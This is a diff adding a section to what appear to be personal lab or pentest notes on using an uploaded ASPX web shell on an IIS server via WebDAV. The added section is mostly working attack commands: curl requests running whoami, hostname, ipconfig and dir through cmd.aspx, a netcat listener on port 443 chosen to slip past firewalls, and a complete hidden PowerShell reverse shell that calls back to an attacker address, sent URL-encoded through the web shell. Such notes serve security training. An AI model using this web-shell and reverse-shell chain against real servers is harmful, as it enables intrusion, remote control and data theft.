@@ -119,3 +119,57 @@ curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://machine_ip/webda
 curl "http://machine_ip/webdav/cmd.aspx?cmd=whoami"
 ```
 - If you get blank response or  500 error, Script Execute permission is not set
+
+
+# ASPX Web Shells
+- Once shell uploaded, the next step is to interact with it and understand what you have
+
+## What an ASPX Web shell Is
+- ASPX web shell is ASP.NET file hosted on web server that accepts attacker input via HTTP and executes it under server process
+- From server perspective, it is just **.aspx** page
+- From attacker perspective, it is remote command interface
+- When IIS receives request for **cmd.aspx**, it passes file to ASP.NET handler
+- Handler compiles and executes the code inside **w3wp.exe**, the IIS worker process
+- This code runs under Application Pool Identity
+- An app pool running as **ApplicationPoolIdentity** has limited system access but inherits **SeImpersonatePrivilege**
+- An app pool running as Domain admin or SYSTEM would give shell immediate high privileges
+
+## Step 1: Execute commands through the shell
+- With **cmd.aspx** uploaded to **/webdav/**, you can run commands by passing them as **cmd** query parameter
+```
+curl "http://machine_ip/webdav/cmd.aspx?cmd=whoami"
+```
+- Try few more commands
+```
+curl "http://10.48.138.215/webdav/cmd.aspx?cmd=hostname"
+curl "http://10.48.138.215/webdav/cmd.aspx?cmd=ipconfig"
+curl "http://10.48.138.215/webdav/cmd.aspx?cmd=dir+C:\\"
+```
+
+## Step 2: Escalate to a Reverse Shell
+- Command shell through browser is useful but limited
+- For interactive access, you want a full reverse shell session
+- First, start Netcat with listen port 443
+```
+nc -lvnp 443
+```
+- Port 443 is preferred over 4444 because outbound HTTPS traffic is almost never blocked by enterprise firewall
+- Next, construct PowerShell reverse shell command and pass it through ASPX shell
+```
+powershell -NoP -NonI -W Hidden -Exec Bypass -c `
+"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443);`
+$stream = $client.GetStream();`
+[byte[]]$bytes = 0..65535|%{0};`
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){`
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);`
+$sendback = (iex $data 2>&1 | Out-String );`
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
+$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`
+$client.Close()""
+```
+- Next
+```
+  curl -G "http://10.49.157.160/webdav/cmd.aspx" \
+>   --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.49.120.54'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'  
+```
